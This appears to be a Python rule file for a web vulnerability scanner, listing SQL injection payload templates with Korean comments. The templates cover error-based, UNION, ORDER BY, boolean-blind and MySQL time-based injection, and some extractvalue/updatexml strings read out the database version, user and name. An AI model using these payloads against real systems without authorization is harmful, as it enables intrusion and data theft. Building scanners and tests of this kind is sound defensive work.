from __future__ import annotations

_SLEEP = 3

_TIME_TEMPLATES = [
    "{value} / sleep({sleep}) ",
    "{value}' / sleep({sleep}) / '",
    '{value}" / sleep({sleep}) / "',
    "{value} AND 0 IN (SELECT sleep({sleep}) ) -- ",
    "{value}' AND 0 IN (SELECT sleep({sleep}) ) -- ",
    '{value}" AND 0 IN (SELECT sleep({sleep}) ) -- ',
    "{value} WHERE 0 IN (SELECT sleep({sleep}) ) -- ",
    "{value}' WHERE 0 IN (SELECT sleep({sleep}) ) -- ",
    '{value}" WHERE 0 IN (SELECT sleep({sleep}) ) -- ',
    "{value} OR 0 IN (SELECT sleep({sleep}) ) -- ",
    "{value}' OR 0 IN (SELECT sleep({sleep}) ) -- ",
    '{value}" OR 0 IN (SELECT sleep({sleep}) ) -- ',
]
_TIME_ATTACK_TEMPLATES = [t.replace("{sleep}", str(_SLEEP)) for t in _TIME_TEMPLATES]
_TIME_CONTROL_TEMPLATES = [t.replace("{sleep}", "0") for t in _TIME_TEMPLATES]


SQLI_RULES: list[dict] = [
    # error: 에러 기반 (DB 에러 메시지 노출로 판정)
    {
        "attack_id": "PL-SQLI-ERROR-META",
        "vuln_type": "sqli",
        "technique": "error_meta",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value}'",
                '{value}"',
                "{value};",
                "{value}NULL",
                "{value}'(",
                "{value})",
                "{value}(",
                "{value}'\"",
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ERROR-UNION",
        "vuln_type": "sqli",
        "technique": "union",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} UNION ALL SELECT NULL -- ",
                "{value}' UNION ALL SELECT NULL -- ",
                '{value}" UNION ALL SELECT NULL -- ',
                "{value}) UNION ALL SELECT NULL -- ",
                "{value}') UNION ALL SELECT NULL -- ",
                '{value}") UNION ALL SELECT NULL -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ERROR-ORDERBY",
        "vuln_type": "sqli",
        "technique": "order_by",
        "category": "error",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} ORDER BY 100-- ",
                "{value}' ORDER BY 100-- ",
                '{value}" ORDER BY 100-- ',
                "{value} ORDER BY 9999-- ",
                "{value}' ORDER BY 9999-- ",
                '{value}" ORDER BY 9999-- ',
            ],
        },
    },
    {
        # extractvalue/updatexml로 값을 마커(~~)로 감싸 에러에 노출, substring 24로 32자 truncate 대응
        "attack_id": "PL-SQLI-ERROR-EXTRACT",
        "vuln_type": "sqli",
        "technique": "error_extract",
        "category": "error",
        "judgment": "extraction",
        "extract_marker": "~~",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
                "{value}' AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
                '{value}" AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ',
                "{value} AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
                "{value}' AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
                '{value}" AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ',
                "{value} AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
                "{value}' AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
                '{value}" AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ',
            ],
        },
    },
    # boolean: 불리언 블라인드 (참/거짓 응답 차이로 판정)
    {
        "attack_id": "PL-SQLI-BOOLEAN",
        "vuln_type": "sqli",
        "technique": "boolean",
        "category": "boolean",
        "sequence": ["baseline", "and_true", "and_false", "or_true", "or_false", "control"],

        "payload_templates": {
            "and_true": [
                "{value} AND 1=1 -- ",
                "{value}' AND '1'='1' -- ",
                '{value}" AND "1"="1" -- ',
                "{value} AND 1=1",
                "{value}' AND '1'='1",
                '{value}" AND "1"="1"',
            ],
            "and_false": [
                "{value} AND 1=2 -- ",
                "{value}' AND '1'='2' -- ",
                '{value}" AND "1"="2" -- ',
                "{value} AND 1=2",
                "{value}' AND '1'='2",
                '{value}" AND "1"="2"',
            ],
            "or_true": [
                "{value} OR 1=1 -- ",
                "{value}' OR '1'='1' -- ",
                '{value}" OR "1"="1" -- ',
                "{value} OR 1=1",
                "{value}' OR '1'='1",
                '{value}" OR "1"="1"',
            ],
            "or_false": [
                "{value} OR 1=2 -- ",
                "{value}' OR '1'='2' -- ",
                '{value}" OR "1"="2" -- ',
                "{value} OR 1=2",
                "{value}' OR '1'='2",
                '{value}" OR "1"="2"',
            ],
            "control": [
                "{value}XYZABCDEFGHIJ",
                "{value}XYZABCDEFGHIJ' -- ",
                '{value}XYZABCDEFGHIJ" -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-TIME-MYSQL",
        "vuln_type": "sqli",
        "technique": "time_mysql",
        "category": "time",
        "sequence": ["baseline", "attack", "control"],
        "payload_templates": {
            "attack": _TIME_ATTACK_TEMPLATES,
            "control": _TIME_CONTROL_TEMPLATES,
        },
    },
]